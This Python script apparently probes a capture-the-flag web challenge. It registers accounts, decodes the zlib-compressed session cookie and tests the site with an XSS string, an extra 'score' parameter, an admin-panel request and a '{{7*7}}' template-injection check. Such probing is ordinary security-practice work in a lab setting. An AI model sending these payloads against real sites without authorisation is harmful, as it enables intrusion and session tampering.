import requests, base64, zlib, json

base = 'https://web-random-cheese.tracebash.xyz'

s = requests.Session()
s.post(f'{base}/register', data={'username': 'testx', 'password': 'testx'}, allow_redirects=False)
s.post(f'{base}/login', data={'username': 'testx', 'password': 'testx'}, allow_redirects=False)
cookie = s.cookies.get('session')
print('Cookie:', repr(cookie))

# Parse: format is .{zlib_compressed_payload}.{timestamp}.{sig}
parts = cookie.split('.')
print('Parts:', len(parts), parts)

# The payload is zlib-compressed JSON
payload_b64 = parts[1]
# Add padding
padded = payload_b64 + '=' * (4 - len(payload_b64) % 4) if len(payload_b64) % 4 else payload_b64
print('Padded payload:', padded)

try:
    decoded_raw = base64.urlsafe_b64decode(padded)
    print('Raw bytes:', decoded_raw)
    # Try zlib decompress
    decompressed = zlib.decompress(decoded_raw)
    print('Decompressed:', decompressed)
    session_data = json.loads(decompressed)
    print('Session data:', session_data)
except Exception as e:
    print('Error:', e)
    # Maybe not compressed? Try plain
    try:
        print('Plain decode:', json.loads(decoded_raw))
    except:
        print('Not plain JSON either')

# Now explore more
s2 = requests.Session()
s2.post(f'{base}/register', data={'username': 'explore', 'password': 'explore'}, allow_redirects=False)
r = s2.post(f'{base}/login', data={'username': 'explore', 'password': 'explore'}, allow_redirects=False)

# Check if there's a way to set score via registration
print('\n--- Trying registration with special chars ---')
r = requests.post(f'{base}/register', data={'username': 'test<script>', 'password': 'test'}, allow_redirects=False)
print('XSS in username:', r.status_code)

# Try to set score/balance parameters
r = requests.post(f'{base}/register', data={'username': 'test2', 'password': 'test2', 'score': '100'}, allow_redirects=False)
print('Score param:', r.status_code)

# Try to access admin panel with different methods
r = requests.post(f'{base}/admin')
print('POST /admin:', r.status_code, r.text[:100])

# Try SSTI in username
r = requests.post(f'{base}/register', data={'username': '{{7*7}}', 'password': 'test'}, allow_redirects=False)
print('SSTI in username:', r.status_code)
r2 = requests.Session()
r2.post(f'{base}/login', data={'username': '{{7*7}}', 'password': 'test'}, allow_redirects=False)
r3 = r2.get(f'{base}/')
if '49' in r3.text or '{{7*7}}' not in r3.text:
    print('SSTI possible!')
print('Dashboard for SSTI:', r3.text[:500].encode('ascii', errors='replace').decode('ascii'))